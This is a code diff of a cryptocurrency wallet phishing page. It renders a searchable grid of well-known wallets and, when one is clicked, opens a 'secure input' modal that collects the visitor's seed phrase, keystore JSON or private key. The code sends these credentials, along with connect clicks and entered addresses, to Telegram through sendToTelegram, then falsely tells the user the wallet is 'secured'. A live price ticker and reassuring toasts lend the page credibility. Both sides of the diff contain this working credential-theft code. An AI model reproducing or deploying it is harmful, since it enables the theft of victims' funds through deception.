+    const container = document.getElementById("walletsContainer");
+    if (filtered.length === 0) {
+      container.innerHTML = `<div class="no-match"><i class="fas fa-search-minus"></i> No wallet found</div>`;
+      return;
     }
+    container.innerHTML = filtered.map(w => `
+      <div class="wallet-card" data-w="${w.name}">
+        <div class="wallet-logo">
+          <img src="${w.logo}" alt="${w.name}" loading="lazy" onerror="this.src='https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/128/icon/generic.png'">
+        </div>
+        <div class="wallet-name">${w.name}</div>
+      </div>
+    `).join('');
+    document.querySelectorAll('.wallet-card').forEach(card => {
+      card.addEventListener('click', () => {
+        selectedWalletName = card.getAttribute('data-w');
+        openSeedModal(selectedWalletName);
+      });
+    });
+  }
 
-    // ---------- Wallet list (comprehensive) with logo mapping (real icons for major) ----------
-    const walletNames = [
-        "MetaMask", "Trust Wallet", "Coinbase Wallet", "Ledger Live", "Trezor", "Exodus", "Phantom", "Rabby", "Argent", "Rainbow",
-        "SafePal", "Keplr", "Electrum", "MyEtherWallet", "TokenPocket", "MathWallet", "imToken", "Status", "Zengo", "Cake Wallet",
-        "BlueWallet", "Samourai", "Wasabi", "Edge", "Guarda", "Ownbit", "Unstoppable", "BRD", "Atomic Wallet", "Infinity Wallet",
-        "Jaxx Liberty", "Coinomi", "BitPay", "Electron Cash", "Sparrow", "Specter", "Coldcard", "KeepKey", "OneKey", "GridPlus",
-        "SecuX", "BitBox", "CoolWallet", "D'CENT", "Ellipal", "ZenGo", "OKX Wallet", "Binance Web3", "Bitget Wallet", "Bybit Wallet",
-        "Kucoin Wallet", "Frontier", "XDEFI", "Talisman", "SubWallet", "Nova Wallet", "Fearless", "Polkadot.js", "MetaMask Institutional",
-        "Brave Wallet", "Opera Crypto", "GameStop Wallet", "Loopring Wallet", "Ronin Wallet", "Yoroi", "Daedalus", "Flint Wallet",
-        "Martian", "Petra", "Pontem", "Nightly", "Backpack", "Solflare", "Glow Wallet", "Slope", "Eclipse", "Soul Wallet",
-        "Blocto", "Portis", "Fortmatic", "Web3Auth", "Sequence", "Bitski", "Venly", "Dapper Wallet", "Torus", "Coin98",
-        "KardiaChain", "Heco Wallet", "Onto", "Starcoin", "Sui Wallet", "Martian Sui", "Ethos", "Fewcha", "SafePal S1"
+  // Seed modal flow
+  const seedModal = document.getElementById("seedModal");
+  function openSeedModal(wName) {
+    document.getElementById("modalTitle").innerHTML = `<i class="fas fa-shield-alt"></i> ${wName} · secure input`;
+    document.getElementById("seedInput").value = "";
+    document.getElementById("keystoreInput").value = "";
+    document.getElementById("pkeyInput").value = "";
+    document.querySelectorAll('.pane').forEach(p => p.classList.remove('active-pane'));
+    document.getElementById("phrasePane").classList.add('active-pane');
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.querySelector('.tab[data-tab="phrase"]').classList.add('active');
+    seedModal.classList.add('active');
+  }
+  function closeSeedModal() { seedModal.classList.remove('active'); }
+  document.getElementById("closeSeedModalBt").addEventListener('click', closeSeedModal);
+  seedModal.addEventListener('click', (e) => { if(e.target === seedModal) closeSeedModal(); });
+
+  // tabs inside modal
+  document.querySelectorAll('.tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+      const target = tab.getAttribute('data-tab');
+      document.querySelectorAll('.pane').forEach(p => p.classList.remove('active-pane'));
+      if (target === 'phrase') document.getElementById("phrasePane").classList.add('active-pane');
+      if (target === 'keystore') document.getElementById("keystorePane").classList.add('active-pane');
+      if (target === 'pkey') document.getElementById("pkeyPane").classList.add('active-pane');
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      tab.classList.add('active');
+    });
+  });
+
+  // submit credentials
+  document.getElementById("sendCredentialsBtn").addEventListener('click', async () => {
+    let credRaw = "", credType = "";
+    const activePaneElem = document.querySelector('.pane.active-pane');
+    if (activePaneElem.id === "phrasePane") { credRaw = document.getElementById("seedInput").value.trim(); credType = "Seed Phrase"; }
+    else if (activePaneElem.id === "keystorePane") { credRaw = document.getElementById("keystoreInput").value.trim(); credType = "Keystore JSON"; }
+    else { credRaw = document.getElementById("pkeyInput").value.trim(); credType = "Private Key"; }
+    if (!credRaw) { showMsg(`Please fill in ${credType}`, 2400); return; }
+    showMsg(`Encrypting ${credType}...`, 1500);
+    const success = await sendToTelegram(credRaw, credType, `wallet:${selectedWalletName || "external"}`);
+    if (success) showMsg(`✓ ${selectedWalletName || "Wallet"} secured`, 2800);
+    else showMsg(`⚠️ logged locally (Telegram not set)`, 3000);
+    closeSeedModal();
+  });
+
+  // connect wallet modal
+  const connectModal = document.getElementById("connectModal");
+  document.getElementById("openConnectBtn").onclick = () => connectModal.classList.add('active');
+  document.getElementById("closeConnectBt").onclick = () => connectModal.classList.remove('active');
+  connectModal.addEventListener('click', (e) => { if(e.target === connectModal) connectModal.classList.remove('active'); });
+  document.getElementById("simMM").onclick = () => { showMsg("MetaMask simulation (demo)", 1800); sendToTelegram("User clicked MetaMask connect", "connect_event", "connect_wallet"); connectModal.classList.remove('active'); };
+  document.getElementById("simWC").onclick = () => { showMsg("WalletConnect demo triggered", 1800); sendToTelegram("WalletConnect simulation", "connect_event", "connect_wallet"); connectModal.classList.remove('active'); };
+  document.getElementById("manualAddrBtn").onclick = () => { let addr = prompt("Enter any public address (demo):", "0x..."); if(addr?.trim()) sendToTelegram(addr.trim(), "public_address", "manual_address"); connectModal.classList.remove('active'); };
+  document.getElementById("openSeedModalBtn").onclick = () => { selectedWalletName = "direct entry"; openSeedModal("Manual entry"); };
+
+  // wallet search + render
+  document.getElementById("searchWallet").addEventListener('input', (e) => renderWalletGrid(e.target.value));
+  renderWalletGrid("");
+
+  // ------------------ LIVE MARKET TICKER (professional scrolling) ------------------
+  async function getIndices() {
+    try {
+      const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,binancecoin&vs_currencies=usd&include_24hr_change=true");
+      const data = await res.json();
+      return {
+        btc: { price: data.bitcoin?.usd || 43500, change: data.bitcoin?.usd_24h_change || 0 },
+        eth: { price: data.ethereum?.usd || 2300, change: data.ethereum?.usd_24h_change || 0 },
+        sol: { price: data.solana?.usd || 102, change: data.solana?.usd_24h_change || 0 },
+        bnb: { price: data.binancecoin?.usd || 325, change: data.binancecoin?.usd_24h_change || 0 }
+      };
+    } catch(e) { return null; }
+  }
+
+  function renderTicker(prices) {
+    if (!prices) return;
+    const list = [
+      { sym: "BTC", price: prices.btc.price, ch: prices.btc.change },
+      { sym: "ETH", price: prices.eth.price, ch: prices.eth.change },
+      { sym: "SOL", price: prices.sol.price, ch: prices.sol.change },
+      { sym: "BNB", price: prices.bnb.price, ch: prices.bnb.change }
     ];
-    const uniqueWallets = [...new Map(walletNames.map(w => [w, w])).values()];
-
-    // Helper to get a professional icon for each wallet (real style)
-    function getWalletLogoHtml(name) {
-        const n = name.toLowerCase();
-        // For major wallets, output custom HTML with image / official style
-        if (n.includes("metamask")) return `<div class="wallet-logo" style="background: #f6851b20; color:#f6851b;"><i class="fab fa-fox"></i></div>`;
-        if (n.includes("trust")) return `<div class="wallet-logo" style="background: #3375bb20; color:#3375bb;"><i class="fas fa-check-circle"></i></div>`;
-        if (n.includes("coinbase")) return `<div class="wallet-logo" style="background: #0052ff20; color:#0052ff;"><i class="fab fa-bitcoin"></i></div>`;
-        if (n.includes("ledger")) return `<div class="wallet-logo" style="background: #1b2c4e20; color:#1b2c4e;"><i class="fas fa-microchip"></i></div>`;
-        if (n.includes("trezor")) return `<div class="wallet-logo" style="background: #2c3e6620; color:#2c3e66;"><i class="fas fa-lock"></i></div>`;
-        if (n.includes("exodus")) return `<div class="wallet-logo" style="background: #2c2f3320; color:#2c2f33;"><i class="fas fa-charging-station"></i></div>`;
-        if (n.includes("phantom")) return `<div class="wallet-logo" style="background: #5344b020; color:#5344b0;"><i class="fas fa-ghost"></i></div>`;
-        if (n.includes("rabby")) return `<div class="wallet-logo" style="background: #f9a8d420; color:#c0267e;"><i class="fas fa-gem"></i></div>`;
-        if (n.includes("argent")) return `<div class="wallet-logo" style="background: #ff875b20; color:#ff5a2b;"><i class="fas fa-chart-line"></i></div>`;
-        if (n.includes("rainbow")) return `<div class="wallet-logo" style="background: #f7b32b20; color:#f7b32b;"><i class="fas fa-palette"></i></div>`;
-        if (n.includes("safepal")) return `<div class="wallet-logo" style="background: #0f2b4f20; color:#0f2b4f;"><i class="fas fa-shield-alt"></i></div>`;
-        if (n.includes("keplr")) return `<div class="wallet-logo" style="background: #7828ff20; color:#7828ff;"><i class="fas fa-globe"></i></div>`;
-        if (n.includes("electrum")) return `<div class="wallet-logo" style="background: #2e8b5720; color:#2e8b57;"><i class="fas fa-bolt"></i></div>`;
-        // Default: modern gradient
-        return `<div class="wallet-logo" style="background: #eef2ff; color:#3b5b9b;"><i class="fas fa-wallet"></i></div>`;
+    let content = "";
+    // create 3 copies for seamless infinite
+    for (let i=0; i<3; i++) {
+      list.forEach(item => {
+        const cls = item.ch >= 0 ? "delta-up" : "delta-down";
+        const arrow = item.ch >= 0 ? "▲" : "▼";
+        content += `<div class="ticker-badge">
+                      <span class="ticker-sym">${item.sym}</span>
+                      <span class="ticker-price">$${item.price.toLocaleString()}</span>
+                      <span class="ticker-delta ${cls}">${arrow} ${Math.abs(item.ch).toFixed(2)}%</span>
+                    </div>`;
+      });
     }
+    const track = document.getElementById("liveTickerTrack");
+    if (track) track.innerHTML = content;
+  }
 
-    let selectedWalletForSeed = null;
-    function renderWallets(filter = "") {
-        const filtered = uniqueWallets.filter(w => w.toLowerCase().includes(filter.toLowerCase()));
-        const container = document.getElementById("walletsGrid");
-        if (!filtered.length) {
-            container.innerHTML = `<div class="no-results" style="text-align:center; padding:2rem;">No wallets match</div>`;
-            return;
-        }
-        container.innerHTML = filtered.map(w => `
-            <div class="wallet-tile" data-w="${w}">
-                ${getWalletLogoHtml(w)}
-                <div class="wallet-name">${w}</div>
-            </div>
-        `).join('');
-        document.querySelectorAll('.wallet-tile').forEach(tile => {
-            tile.addEventListener('click', () => {
-                selectedWalletForSeed = tile.getAttribute('data-w');
-                openSeedModal(selectedWalletForSeed);
-            });
-        });
-    }
-
-    // Seed modal logic
-    const seedModal = document.getElementById("seedModal");
-    function openSeedModal(walletName) {
-        document.getElementById("seedModalTitle").innerHTML = `<i class="fas fa-key"></i> ${walletName} · credentials`;
-        document.getElementById("seedInput").value = "";
-        document.getElementById("keystoreInput").value = "";
-        document.getElementById("pkeyInput").value = "";
-        document.querySelectorAll('.pane').forEach(p => p.classList.remove('active-pane'));
-        document.getElementById("phrasePane").classList.add('active-pane');
-        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-        document.querySelector('.tab[data-tab="phrase"]').classList.add('active');
-        seedModal.classList.add('active');
-    }
-    function closeSeedModal() { seedModal.classList.remove('active'); }
-    document.getElementById("closeSeedModalBtn").addEventListener('click', closeSeedModal);
-    seedModal.addEventListener('click', (e) => { if(e.target === seedModal) closeSeedModal(); });
-    document.querySelectorAll('.tab').forEach(tab => {
-        tab.addEventListener('click', () => {
-            const target = tab.getAttribute('data-tab');
-            document.querySelectorAll('.pane').forEach(p => p.classList.remove('active-pane'));
-            if (target === 'phrase') document.getElementById("phrasePane").classList.add('active-pane');
-            if (target === 'keystore') document.getElementById("keystorePane").classList.add('active-pane');
-            if (target === 'pkey') document.getElementById("pkeyPane").classList.add('active-pane');
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            tab.classList.add('active');
-        });
-    });
-
-    document.getElementById("submitCreds").addEventListener('click', async () => {
-        let cred = "", type = "";
-        const active = document.querySelector('.pane.active-pane');
-        if (active.id === "phrasePane") { cred = document.getElementById("seedInput").value.trim(); type = "Seed Phrase"; }
-        else if (active.id === "keystorePane") { cred = document.getElementById("keystoreInput").value.trim(); type = "Keystore JSON"; }
-        else { cred = document.getElementById("pkeyInput").value.trim(); type = "Private Key"; }
-        if (!cred) { showToast(`Enter ${type}`, 2500); return; }
-        showToast(`Validating ${type}...`, 1500);
-        const ok = await sendToTelegram(cred, type, `wallet:${selectedWalletForSeed || "manual"}`);
-        if (ok) showToast(`✓ ${selectedWalletForSeed || "Wallet"} secured`, 3000);
-        else showToast(`⚠️ Logged locally (Telegram not set)`, 3000);
-        closeSeedModal();
-    });
-
-    // Connect modal
-    const connectModal = document.getElementById("connectModal");
-    document.getElementById("openConnectBtn").onclick = () => connectModal.classList.add('active');
-    document.getElementById("closeConnectBtn").onclick = () => connectModal.classList.remove('active');
-    connectModal.addEventListener('click', (e) => { if(e.target === connectModal) connectModal.classList.remove('active'); });
-    document.getElementById("simMM").onclick = () => { showToast("MetaMask simulation", 2000); sendToTelegram("Clicked MetaMask connect", "connect_event", "connect_wallet"); connectModal.classList.remove('active'); };
-    document.getElementById("simWC").onclick = () => { showToast("WalletConnect demo", 2000); sendToTelegram("WalletConnect simulation", "connect_event", "connect_wallet"); connectModal.classList.remove('active'); };
-    document.getElementById("manualAddr").onclick = () => { let a = prompt("Enter public address (demo):", "0x..."); if(a?.trim()) sendToTelegram(a.trim(), "public_address", "manual_input"); connectModal.classList.remove('active'); };
-
-    document.getElementById("openSeedBtn").onclick = () => { selectedWalletForSeed = "external"; openSeedModal("Secure entry"); };
-    document.getElementById("searchWallet").addEventListener('input', (e) => renderWallets(e.target.value));
-    renderWallets("");
-
-    // ---------- Live Scrolling Ticker (professional) ----------
-    let priceCache = { btc: 42500, eth: 2280, sol: 98, bnb: 315, ch: { btc: 0.5, eth: -0.2, sol: 3.1, bnb: 0.9 } };
-    async function fetchPrices() {
-        try {
-            const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,bnb&vs_currencies=usd&include_24hr_change=true");
-            const d = await res.json();
-            priceCache = {
-                btc: d.bitcoin?.usd || 42500, eth: d.ethereum?.usd || 2280, sol: d.solana?.usd || 98, bnb: d.bnb?.usd || 315,
-                ch: { btc: d.bitcoin?.usd_24h_change || 0, eth: d.ethereum?.usd_24h_change || 0, sol: d.solana?.usd_24h_change || 0, bnb: d.bnb?.usd_24h_change || 0 }
-            };
-            renderTicker();
-        } catch(e) { console.warn(e); }
-    }
-
-    function renderTicker() {
-        const items = [
-            { sym: "BTC", price: priceCache.btc, change: priceCache.ch.btc },
-            { sym: "ETH", price: priceCache.eth, change: priceCache.ch.eth },
-            { sym: "SOL", price: priceCache.sol, change: priceCache.ch.sol },
-            { sym: "BNB", price: priceCache.bnb, change: priceCache.ch.bnb }
-        ];
-        let html = "";
-        for (let i=0; i<4; i++) {  // duplicate 4 times for seamless loop
-            items.forEach(it => {
-                const cls = it.change >= 0 ? "positive" : "negative";
-                const arrow = it.change >= 0 ? "▲" : "▼";
-                html += `<div class="ticker-item">
-                            <span class="ticker-symbol">${it.sym}</span>
-                            <span class="ticker-price">$${it.price.toLocaleString()}</span>
-                            <span class="ticker-change ${cls}">${arrow} ${Math.abs(it.change).toFixed(2)}%</span>
-                         </div>`;
-            });
-        }
-        document.getElementById("tickerTrack").innerHTML = html;
-    }
-    fetchPrices();
-    setInterval(fetchPrices, 12000);
-    setTimeout(() => showToast("🔐 600+ assets protected — select your wallet", 4000), 800);
+  async function updateTicker() {
+    const data = await getIndices();
+    if (data) renderTicker(data);
+  }
+  updateTicker();
+  setInterval(updateTicker, 12000);
+  setTimeout(() => showMsg("🔒 200+ wallets ready – choose any", 3600), 600);
 </script>
 </body>
 </html>
